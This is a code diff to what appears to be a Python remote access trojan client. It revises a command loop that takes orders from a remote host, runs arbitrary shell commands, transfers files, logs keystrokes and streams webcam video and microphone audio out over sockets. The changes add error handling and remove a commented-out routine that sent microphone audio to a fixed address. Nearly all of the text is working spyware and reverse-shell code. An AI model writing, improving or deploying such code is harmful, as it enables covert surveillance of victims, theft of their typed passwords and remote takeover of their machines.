@@ -97,9 +97,6 @@ def start_keylogging(filename):
     keylogger_listener.start()                              # Start the listener to capture key events
     print(f'[+] Keylogging started: {filename}')
 
-    # this comment section is for uploading the keylog file periodically (not yet implemented)
-
-
 def stop_keylogging():
     global keylogger_listener, keylogging_filename              # Use the global variable to stop the listener
     filename = keylogging_filename
@@ -205,7 +202,7 @@ def start_video_stream():
         message_size = struct.pack("L", len(frame_data))
         try:
             video_socket.sendall(message_size + frame_data)
-        except (ConnectionResetError, BrokenPipeError):
+        except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
             break
     
     print("[*] Video streaming stopped.")
@@ -231,7 +228,7 @@ def start_audio_stream():
         try:
             data = stream.read(1024)
             audio_socket.sendall(data)
-        except (ConnectionResetError, BrokenPipeError, IOError):
+        except (ConnectionResetError, BrokenPipeError, IOError, ConnectionAbortedError):
             break
 
     print("[*] Audio streaming stopped.")
@@ -240,71 +237,6 @@ def start_audio_stream():
     p.terminate()
     audio_socket.close()
     audio_stream_active = False
-
-# Function to listen for a command to stop the live audio stream
-# def listen_for_audio_stop():
-#     global liveaudio_status, p, stream, audio_sock
-
-#     while liveaudio_status:
-#         try:
-#             command = reliable_recv()
-#             if command[:14] == 'liveaudio_stop':
-#                 liveaudio_status = False
-#                 print("[+] Stopping live audio stream...")
-#                 break
-#         except:
-#             continue
-
-
-# def write_audio_to_file():
-#     global liveaudio_status, p, stream, audio_sock, audio_filename
-#     filename = audio_filename
-
-#     frames = []
-
-#     while liveaudio_status:
-#         data = stream.read(1024)
-#         frames.append(data)
-
-#     with wave.open(filename, 'wb') as wf:
-#         wf.setnchannels(1)
-#         wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
-#         wf.setframerate(44100)
-#         wf.writeframes(b''.join(frames))
-
-#     upload_file(filename)
-#     os.remove(filename)
-#     audio_filename = None
-#     print(f"[+] Audio stream saved to {filename} and uploaded.")
-
-
-# def liveaudio_start():
-#     global liveaudio_status, p, stream, audio_sock, audio_filename
-
-#     p = pyaudio.PyAudio()
-#     stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
-#     audio_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-#     print("[+] Streaming mic...")
-
-#     # Start background thread to listen for stop command
-#     stop_listener = threading.Thread(target=listen_for_audio_stop, daemon=True)
-#     stop_listener.start()
-
-#     if audio_filename != None:
-#         audiofile_writer = threading.Thread(target=write_audio_to_file, daemon=False)
-#         audiofile_writer.start()
-
-#     while liveaudio_status:
-#         data = stream.read(1024)
-#         audio_sock.sendto(data, ('192.168.1.39', 7777))
-
-#     stream.stop_stream()
-#     stream.close()
-#     p.terminate()
-#     audio_sock.close()
-#     p, stream, audio_sock = None, None, None
-#     print("[+] Audio stream closed.")
 
 
 def shell():
@@ -315,13 +247,20 @@ def shell():
         # Receive a command from the remote host
         command = reliable_recv()
         if command == 'quit':
+            video_stream_active = False
+            audio_stream_active = False
             break
 
         elif command == 'clear':
             pass
 
         elif command[:3] == 'cd ':
-            os.chdir(command[3:])
+            try:
+                os.chdir(command[3:])
+                reliable_send("[+] Changed Directory To: " + os.getcwd())
+            except Exception as e:
+                reliable_send("[-] " + str(e))
+
 
         elif command[:8] == 'download':
             upload_file(command[9:])
@@ -330,10 +269,10 @@ def shell():
             download_file(command[7:])
 
         elif command[:16] == 'keylogging_start':
-            filename = re.sub(r'[\\/:*?"<>|]', '', command[17:]).replace(' ', '')  # clean the filename to avoid invalid characters
+            filename = re.sub(r'[\\/:*?"<>|]', '', command[17:]).replace(' ', '')
 
             if not keylogger_status:
-                keylogging_filename = filename if (len(command) > 17 and filename != "") else 'keylog.txt' # Default filename if not specified
+                keylogging_filename = filename if (len(command) > 17 and filename != "") else 'keylog.txt'
                 start_keylogging(keylogging_filename)
                 keylogger_status = True
             else:
@@ -349,10 +288,8 @@ def shell():
         elif command[:15] == 'keylogging_live':
             if not livekeylogging_status:
                 filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')
-
                 if len(command) > 16:
                     keylogging_filename = filename if (filename != "") else 'keylog.txt'
-
                 livekeylogging_status = True
                 keylogging_live()
             else:
@@ -365,28 +302,25 @@ def shell():
             if not audio_stream_active:
                 audio_stream_active = True
                 threading.Thread(target=start_audio_stream, daemon=True).start()
-            reliable_send(s, "[+] Stream threads initiated.")
+            reliable_send("[+] Stream threads initiated on client.")
+
         elif command == 'stream_stop':
             video_stream_active = False
             audio_stream_active = False
-            reliable_send(s, "[-] Stopping stream threads.")
+            reliable_send("[-] Stopping stream threads on client.")
 
         else:
             # For other commands, execute them using subprocess
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
-            result = result.decode()  # Decode the output to a string
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode(errors='replace')
             # Send the command execution result back to the remote host
             reliable_send(result)
 
 
-# p, stream, audio_sock = None, None, None  # Initialize PyAudio and stream variables to None
-
 keylogger_status,  livekeylogging_status =  False, False
 
-# audio_filename, keylogging_filename = None, None # Default filename for keylogging and live-audio
-
-keylogger_listener = None  # Initialize the keylogger listener variable
+keylogger_listener = None
 
 # Create a socket object for communication over IPv4 and TCP
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
